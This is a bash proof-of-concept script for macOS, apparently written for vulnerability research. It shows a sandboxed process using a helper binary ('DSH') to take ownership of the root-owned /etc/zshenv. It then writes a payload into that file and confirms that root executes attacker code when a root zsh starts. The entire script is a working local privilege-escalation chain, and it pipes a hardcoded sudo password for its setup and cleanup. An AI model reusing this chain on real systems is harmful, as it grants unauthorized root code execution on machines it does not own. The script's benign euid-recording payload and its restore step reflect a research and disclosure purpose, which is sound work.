#!/bin/bash
# Forward-only root code-exec via owner-agnostic consumer (/etc/zshenv)
set +e
PROBE=/Users/test/dsh_repair_probe
Z=/etc/zshenv
BK=/tmp/zshenv.bak.$$

echo "== setup: ensure root-owned /etc/zshenv (back up if present) =="
echo test | sudo -S sh -c "[ -f '$Z' ] && cp '$Z' '$BK'; touch '$Z'; chown root:wheel '$Z'; chmod 644 '$Z'"
echo "zshenv: $(ls -ln $Z)"
echo "attacker can write zshenv now? $([ -w $Z ] && echo yes || echo no)"
echo

echo "== STEP 1: sandboxed attacker chowns /etc/zshenv via DSH =="
sandbox-exec -p '(version 1)(allow default)' "$PROBE" "$Z" >/dev/null 2>&1
sleep 1
echo "zshenv owner now: $(stat -f '%Su' $Z)   attacker-writable? $([ -w $Z ] && echo yes || echo no)"
echo

echo "== STEP 2: attacker injects payload (records euid when sourced) =="
PROOF=/tmp/zshenv_root_proof_$$
cat > "$Z" <<PAY
id -u > $PROOF 2>/dev/null
PAY
echo "payload written by $(id -un); zshenv now owner=$(stat -f '%Su' $Z)"
echo

echo "== STEP 3: a root zsh runs (cron/periodic/admin/script) — simulated by 'sudo zsh' =="
rm -f "$PROOF"
echo test | sudo -S zsh -c 'true' 2>/dev/null
sleep 0.5
echo "euid captured by payload when root sourced zshenv: $(cat $PROOF 2>/dev/null || echo '(none)')"
[ "$(cat $PROOF 2>/dev/null)" = "0" ] && echo ">>> *** FORWARD-ONLY ROOT CODE EXEC CONFIRMED (root ran attacker code) ***" || echo ">>> not triggered"
echo

echo "== cleanup: restore zshenv =="
if [ -f "$BK" ]; then echo test | sudo -S sh -c "cp '$BK' '$Z'; chown root:wheel '$Z'; chmod 644 '$Z'; rm -f '$BK'"; else echo test | sudo -S rm -f "$Z"; fi
echo test | sudo -S rm -f "$PROOF"
echo "restored: $(ls -ln $Z 2>/dev/null || echo 'removed (was absent originally)')"